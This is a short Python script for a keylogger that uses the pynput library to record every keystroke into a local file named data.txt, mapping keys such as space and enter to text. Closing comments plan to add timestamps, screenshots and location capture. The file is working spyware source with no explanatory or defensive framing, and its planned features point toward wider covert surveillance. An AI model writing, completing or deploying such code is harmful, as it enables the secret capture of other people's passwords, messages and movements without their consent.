from pynput.keyboard import Listener

def writetofile(key):
    letter = str(key)
    letter = letter.replace("'", "")
    
    if letter == 'Key.space':
        letter = ' '
    if letter == 'Key.shift_r':
        letter = ''
    if letter == 'Key.ctrl_1':
        letter = ""
    if letter == "Key.enter":
        letter = "\n"
    
    with open("data.txt", "a") as file:
        file.write(letter)

def main():        
    with Listener(on_press=writetofile) as listen:
        listen.join()
    
# Improve data opening
# Add timestamp
# Add screenshot
# Add get location